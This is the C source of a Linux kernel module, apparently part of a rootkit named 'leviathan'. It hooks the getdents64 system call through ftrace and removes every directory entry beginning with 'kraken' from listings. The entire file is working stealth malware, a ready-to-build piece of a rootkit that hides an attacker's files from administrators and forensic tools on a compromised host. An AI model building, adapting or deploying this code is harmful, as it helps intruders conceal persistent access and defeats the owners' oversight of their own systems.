#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/list.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include "ftrace_helper.h"

#define HIDE_DIR "kraken"     // Your Directory name to hide

MODULE_LICENSE("GPL");
MODULE_AUTHOR("mtzsec");
MODULE_DESCRIPTION("A module that hooks getdents64 to hide directories");

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

// Hooked getdents64 function
static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *user_dir = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64 *kernel_dir_buffer = NULL;
    struct linux_dirent64 *current_entry = NULL;
    struct linux_dirent64 *prev_entry = NULL;
    long error;
    unsigned long offset = 0;
    long result;

    result = orig_getdents64(regs);
    if (result <= 0) {
        return result;
    }

    kernel_dir_buffer = kmalloc(result, GFP_KERNEL);
    if (!kernel_dir_buffer) {
        return -ENOMEM;
    }

    error = copy_from_user(kernel_dir_buffer, user_dir, result);
    if (error) {
        kfree(kernel_dir_buffer);
        return -EFAULT;
    }

    while (offset < result) {
        current_entry = (struct linux_dirent64 *)((char *)kernel_dir_buffer + offset);

        if (strncmp(current_entry->d_name, HIDE_DIR, strlen(HIDE_DIR)) == 0) {
            if (current_entry == kernel_dir_buffer) {
                result -= current_entry->d_reclen;
                memmove(kernel_dir_buffer, (char *)kernel_dir_buffer + current_entry->d_reclen, result);
                continue;
            }

            if (prev_entry) {
                prev_entry->d_reclen += current_entry->d_reclen;
            }
        } else {
            prev_entry = current_entry;
        }

        offset += current_entry->d_reclen;
    }

    error = copy_to_user(user_dir, kernel_dir_buffer, result);
    kfree(kernel_dir_buffer);

    return result;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
};

static int __init leviathan_init(void) {
    int error;

    error = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (error) {
        return error;
    }
    return 0;
}

static void __exit leviathan_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(leviathan_init);
module_exit(leviathan_exit);
